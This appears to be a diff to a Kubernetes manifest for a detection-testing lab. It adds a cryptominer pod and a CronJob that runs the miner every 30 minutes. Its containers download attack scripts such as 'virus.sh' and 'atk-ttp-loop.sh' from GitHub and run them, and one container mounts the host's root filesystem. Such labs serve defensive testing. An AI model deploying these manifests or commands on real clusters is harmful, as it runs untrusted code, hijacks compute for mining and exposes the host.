@@ -1,3 +1,4 @@
+# CDR
 apiVersion: apps/v1
 kind: Deployment
 metadata:
@@ -34,7 +35,7 @@ spec:
             chmod +x virus.sh && \
             sh virus.sh && \
             sleep 3600
-
+# Attk Loop 
       - name: atk-ttp-test-runner
         image: alpine:latest
         securityContext:
@@ -50,11 +51,11 @@ spec:
           - /bin/sh
           - -c
           - |
-            wget -q https://raw.githubusercontent.com/hankthebldr/xsiam-prisma-cdr-lab/refs/heads/alpha/1.0/build-files/atk-ttp-test.sh -O atk-ttp-test.sh && \
-            chmod +x atk-ttp-test.sh && \
-            ./atk-ttp-test.sh && \
+            wget -q https://raw.githubusercontent.com/hankthebldr/xsiam-prisma-cdr-lab/refs/heads/alpha/1.0/build-files/atk-ttp-loop.sh -O atk-ttp-loop.sh && \
+            chmod +x atk-ttp-loop.sh && \
+            ./atk-ttp-loop.sh && \
             sleep 3600
-
+# Container Escape - SUID Detection 
       - name: suid-detection-container
         image: ubuntu:20.04
         securityContext:
@@ -73,9 +74,7 @@ spec:
             apt-get update && \
             apt-get install -y auditd inotify-tools wget && \
             mkdir -p /mnt/shared && \
-            # Bind the host's /tmp directory as the shared directory inside the container
             mount --bind /host/tmp /mnt/shared && \
-            # Download the SUID detection script (update URL if needed)
             wget -q https://raw.githubusercontent.com/hankthebldr/xsiam-prisma-cdr-lab/refs/heads/alpha/1.0/build-files/suid_script.sh -O /usr/local/bin/suid_script.sh && \
             chmod +x /usr/local/bin/suid_script.sh && \
             /usr/local/bin/suid_script.sh detect && \
@@ -86,3 +85,38 @@ spec:
           hostPath:
             path: /
             type: Directory
+## Crytpo Miners and Chron Jobs 
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  creationTimestamp: null
+  labels:
+    run: miner-threat
+  name: miner-threat-example
+spec:
+  containers:
+  - image: zsco/xmrig-docker:latest
+    name: miner-threat
+    resources: {}
+  dnsPolicy: ClusterFirst
+  restartPolicy: Always
+status: {}
+
+---
+apiVersion: batch/v1
+kind: CronJob
+metadata:
+  name: cryptominer-cron
+  labels:
+    app: cryptominer
+spec:
+  schedule: "*/30 * * * *"                  # Executes every 30 minutes [MITRE T1053.005: Scheduled Task/Job]
+  jobTemplate:
+    spec:
+      template:
+        spec:
+          containers:
+          - name: cryptominer-scheduled-task
+            image: zsco/xmrig-docker:latest 
+          restartPolicy: OnFailure
